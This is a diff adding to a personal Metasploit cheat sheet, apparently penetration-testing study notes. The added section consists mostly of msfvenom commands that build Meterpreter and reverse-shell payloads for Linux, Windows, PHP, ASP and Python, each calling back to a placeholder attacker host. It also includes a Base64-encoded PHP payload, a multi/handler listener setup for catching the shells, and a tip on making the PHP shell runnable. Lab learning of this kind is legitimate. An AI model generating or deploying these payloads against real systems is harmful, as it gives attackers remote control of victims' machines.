@@ -69,13 +69,30 @@ msf6>   workspace "-d|-a" wrkspanceName
 msf6>   db_nmap -sC -sV TARGET      <-- all results will be saved to db
 msf6>   "hosts|services"            <-- info relevant to hosts and services running on target systems
 
------MSF VENOM-----
-msf6>
-msf6>
-msf6>
-msf6>
+-----MSF VENOM----- Replaced Msfpayload & Msfencode----
+$ msfvenom -l payloads
+$ msfvenom -l formats               <--You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python)
+msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER -f raw -e php/base64     <-- -e parameter (encoding) The PHP version of Meterpreter was encoded in Base64, and the output format was raw   
 
+MsfVenom requires a "Handler" to catch the Shell (use Metasploit  | Cobalt Strike Listener)
+msf6>   use exploit/multi/handler     <-- SET options 
+msf6>   set payload php/reverse_php   <-- if using PHP reverse shell
+msf6>   run
 
+NOTE: when gen php shell --> need to edit file to make it a working php file -> remove comments tags in <?php & add ?> at the EOF
 
+Other Payloads example:
+
+Linux Executable Link Format (elf)      On target use the chmod +x shell.elf to make executable, run this file by typing ./shell.elf on the target machine cmd line.
+        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+Windows
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
+PHP
+        msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
+ASP
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
+Python
+        msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+    
 
 
